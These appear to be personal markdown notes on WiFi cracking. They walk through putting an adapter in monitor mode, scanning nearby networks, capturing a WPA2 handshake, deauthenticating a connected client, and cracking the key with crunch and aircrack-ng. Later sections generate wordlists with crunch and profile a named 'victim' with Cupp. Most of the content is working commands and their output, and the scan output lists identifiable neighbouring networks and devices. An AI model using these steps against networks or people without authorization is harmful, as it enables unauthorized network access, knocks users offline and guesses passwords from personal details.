[TOC]



# WIFI Hacking

alfa awus036nh
e8:4e:06:4b:62:fc



**Restoring Networkmanager after airmon-ng check kill**

```
# airmon-ng stop wlan0mon (or whatever the virtual interface name is)
# service NetworkManager start
# service wpa_supplicant start
```



## Bruteforce attack

Kill processes that can cause problem 

```
# airmon-ng check kill
```



1. List the available wifi interface

```
# airmon-ng 

PHY	Interface	Driver		Chipset

phy0	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
phy3	wlxe84e064b62fc	rt2800usb	Ralink Technology, Corp. RT2870/RT3070

```



2. Set Wireless Interface on Monitor Mode

```
# airmon-ng start wlp1s0


PHY	Interface	Driver		Chipset

phy0	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)

		(mac80211 monitor mode vif enabled for [phy0]wlp1s0 on [phy0]wlp1s0mon)
		(mac80211 station mode vif disabled for [phy0]wlp1s0)
phy3	wlxe84e064b62fc	rt2800usb	Ralink Technology, Corp. RT2870/RT3070

```



3. Scan For Available WiFis

```
# airodump-ng wlan0mon
```



Output

```


CH 14 ][ Elapsed: 1 min ][ 2021-01-23 18:18 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 BC:C0:0F:D2:C2:A8   -1        0        2    0  11   -1   WPA              <length:  0>                              
 F0:D1:A9:16:0A:28  -12       42        6    1   6  130   WPA2 CCMP   PSK  Sherwin's Wi-Fi Network                   
 3C:84:6A:A7:EB:B0  -30       45       12    0  10  195        CCMP   PSK  <length:  0>                              
 42:84:6A:A7:EB:B0  -30       52        0    0  10  195   WPA2 CCMP   PSK  <length:  0>                              
 BC:98:89:9D:3C:58  -38       44        6    0  11  130   WPA2 CCMP   PSK  PLDTHOMEFIBR-SHEN                         
 3E:77:E6:88:83:E2  -48       46        0    0   2  130   WPA2 CCMP   PSK  DIRECT-T5-BRAVIA                          
 E4:AB:89:82:82:03  -68       28       18    0   4  130   WPA2 CCMP   PSK  GlobeAtHome-2.4G-828203                   
 00:25:00:FF:94:73   -1        0        0    0  -1   -1                    <length:  0>                              
 8C:25:05:E1:7D:34  -71        6        0    0   1  270   WPA  CCMP   PSK  B315_17D34                               
```

4. Generate the Traffic that will be used

```
# airodump-ng -c 6 --bssid F0:D1:A9:16:0A:28 -w /home/sherwinowen/Desktop/wifi/bf_test wlan0mon
```

- -w name of the file that will be generated, the pcap will be saved in the current working direcory where the command was run at unless the path is specified.

- -bssid  specifies the bssid <From the output of the previous command> of the WiFi you wish to crack its passwords.

- -channel specifies the channel to listen on.

- -wlan0mon specifies the interface to capture traffic on.

  

Output

```
   CH 11 ][ Elapsed: 18 mins ][ 2021-01-23 21:44 ][ WPA handshake: BC:98:89:9D:3C:58 
  
   BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
  
   BC:98:89:9D:3C:58  -42  98     2860   388479  144  11  130   WPA2 CCMP   PSK  PLDTHOMEFIBR-SHEN                     
  
   BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
  
   BC:98:89:9D:3C:58  E4:B3:18:08:C9:79  -22    0e- 0e     0    34896  EAPOL                                            
   BC:98:89:9D:3C:58  8E:57:89:77:47:F4  -42    1e-24      0     5992                                                   
   BC:98:89:9D:3C:58  C8:85:50:E8:88:C4  -50    0e-24      6   135995                                                   
   BC:98:89:9D:3C:58  5C:1D:D9:4B:3E:0C  -56    0e- 0e     0   157853  
```

  

5. DeAuthenticate a connected Device

```
# aireplay-ng -0 0 -a BC:98:89:9D:3C:58 -c e4:b3:18:08:c9:79 wlan0mon

```

- -0  sets the count of number of deauthentication packets to send to the connected clients, station(s).
- -a  specify or set Access Point MAC Address, this case the BSSID of the WiFi you wish to crack its WEP and WPA-PSK Keys to get its password.
- -c  specify or set destination MAC address, in this case is the Device, STATION you want to deauthenticate from the WiFi network.
- wlan0mon  specifies the interface on promiscuous mode.

Output

```
21:36:50  Waiting for beacon frame (BSSID: BC:98:89:9D:3C:58) on channel 11
21:36:51  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [13|29 ACKs]
21:36:52  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [10|26 ACKs]
21:36:52  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [17|21 ACKs]
21:36:53  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 6|20 ACKs]
21:36:54  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 7|22 ACKs]
21:36:54  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [32|28 ACKs]
21:36:55  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [47|29 ACKs]
21:36:56  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [17|32 ACKs]
21:36:56  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [30|29 ACKs]
21:36:57  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [54|62 ACKs]
21:36:58  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [90|60 ACKs]
21:36:58  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [54|57 ACKs]
21:36:59  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [67|48 ACKs]
21:37:00  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [91|51 ACKs]
21:37:00  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [70|64 ACKs]
21:37:01  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [25|41 ACKs]
21:37:02  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 8|43 ACKs]
21:37:02  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [38|25 ACKs]
21:37:03  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [12|34 ACKs]
21:37:04  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [22|52 ACKs]
21:37:04  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [82|48 ACKs]
21:37:05  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [14|41 ACKs]
21:37:06  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [12|38 ACKs]
21:37:06  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [43|44 ACKs]
21:37:07  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [21|42 ACKs]
21:37:07  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [22|41 ACKs]
21:37:08  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 5|22 ACKs]
21:37:09  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 6|32 ACKs]
21:37:09  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 6|29 ACKs]
21:37:10  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 6|40 ACKs]
21:37:10  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 9|42 ACKs]
21:37:11  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [20|28 ACKs]
21:37:12  Sending 64 directed DeAuth (code 7). STMAC: [E4:B3:18:08:C9:79] [ 8|37 ACKs]
```

6. Crack password using crunch and aircack-ng

```
# crunch 14 14 '(#R3!neL$yl)' | aircrack-ng -a2 -b BC:98:89:9D:3C:58 -w - /home/sherwinowen/Desktop/wifi/bf_test-01.cap
```



## Dictionary Attack

Start dictionary attack with Aircrack

```
# aircrack-ng -a2 -b BC:98:89:9D:3C:58 -w /dictionary/wordlist /wifi/bf_test-01.cap
```

- -b BSSID

- -w [POSSIBLE_PASSWORDS_FILE.TXT] [PATH_TO_WPA_HANDSHAKE_FILES*.cap]

  

## Generate wordlist using crunch

```
# Generating wordlist using the character string
crunch 3 4 raj -o /root/Desktop/1.txt

# Generating alpha-numeric wordlist
crunch 2 3 raj123 -o /root/Desktop/3.txt

# Generating wordlist along with space character
crunch 1 3 raj\ -o /root/Desktop/4.txt

# Create wordlist using character set file of RainbowCrack
crunch 4 5 -f /usr/share/rainbowcrack/charset.txt loweralpha-numeric -o /root/Desktop/5.txt

# Generate wordlist with specific Pattern
Using option –t you can generate 4 type patters as specified below:
- Use @ for lowercase alphabets
- Use , for uppercase alphabets
- Use % for numeric character
- Use ^ for special character symbol
crunch 6 6 -t raj%%% -o /root/Desktop/6.txt

# Generate wordlist with Duplicate character limit
crunch 6 6 -t raj%%% -d 2% -o /root/Desktop/6.1.txt

# Use Permutation for generating a wordlist
crunch 3 6 -p raj chandel hackingarticles
Crunch will now generate approximately the following amount of data: 156 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 6 
chandelhackingarticlesraj
chandelrajhackingarticles
hackingarticleschandelraj
hackingarticlesrajchandel
rajchandelhackingarticles
rajhackingarticleschandel

# Generate a Dictionary with limited words
crunch 5 5 IGNITE -c 25 
Crunch will now generate the following amount of data: 150 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 25 
IIIII
IIIIG
IIIIN
IIIIT
IIIIE
IIIGI
IIIGG
IIIGN
IIIGT
IIIGE
IIINI
IIING
IIINN
IIINT
IIINE
IIITI
IIITG
IIITN
IIITT
IIITE
IIIEI
IIIEG
IIIEN
IIIET
IIIEE
```

**Wordlist Fragmentation**

Use **–b option** for wordlist fragmentation that split a single wordlist into multi wordlist. It is a quite useful option for dividing wordlist which is in GB can break into MB.

```
crunch 5 7 raj@123 -b 3mb -o START
```

**Generate compressed Dictionary**

Crunch let you generate compress wordlist with **option –z** and other parameters are gzip, bzip2, lzma, and 7z, execute given below command for compression.

```
crunch 5 7 raj@123 –z gzip -o START
```



## Creating password list with Cupp

```
root@Hackingvision:~/cupp# python cupp.py -i

[+] Insert the informations about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: morgan
> Surname: peter
> Nickname: parker
> Birthdate (DDMMYYYY): 09091997


> Partners) name: 
> Partners) nickname: spiderman
> Partners) birthdate (DDMMYYYY):


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY):


> Pet's name: scooby
> Company name: hackingvision


> Do you want to add some key words about the victim? Y/[N]: any specific keyword
> Do you want to add special chars at the end of words? Y/[N]: n
> Do you want to add some random numbers at the end of words? Y/[N]:n
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to morgan.txt, counting 1524 words.
[+] Now load your pistolero with morgan.txt and shoot! Good luck!
```

